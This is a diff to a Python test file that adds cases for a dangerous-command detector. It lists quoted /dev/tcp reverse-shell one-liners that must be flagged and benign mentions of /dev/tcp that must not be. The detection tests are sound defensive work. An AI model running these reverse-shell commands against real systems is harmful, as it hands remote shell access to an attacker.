@@ -40,3 +40,27 @@ def test_reverse_shell_requires_approval(command):
 ])
 def test_reverse_shell_prose_and_plain_netcat_not_flagged(command):
     assert detect_dangerous_command(command)[0] is False
+
+
+# A quoted redirect target opens the same socket; only `>&` was caught before, via the `&` separator split.
+@pytest.mark.parametrize("command", [
+    'bash -i > "/dev/tcp/h/1" 0>&1',
+    'sh -i < "/dev/tcp/h/1"',
+    "sh -i 0<'/dev/tcp/h/1' 1>&0",
+    'exec 3<>"/dev/tcp/h/80"',
+    'bash -i &> "/dev/tcp/h/1" 0>&1',
+    'echo x >> "/dev/udp/h/53"',
+    'bash -i > /dev/"tcp"/h/1 0>&1',
+    'bash -c \'bash -i > "/dev/tcp/h/1" 0>&1\'',
+])
+def test_quoted_dev_tcp_redirect_target_requires_approval(command):
+    assert detect_dangerous_command(command)[0] is True
+
+
+@pytest.mark.parametrize("command", [
+    'echo "> /dev/tcp/h/1" > notes.md',
+    "cat <<<'/dev/tcp/h/1'",
+    "ls > out.txt; grep /dev/tcp notes",
+])
+def test_dev_tcp_in_data_or_here_string_not_flagged(command):
+    assert detect_dangerous_command(command)[0] is False
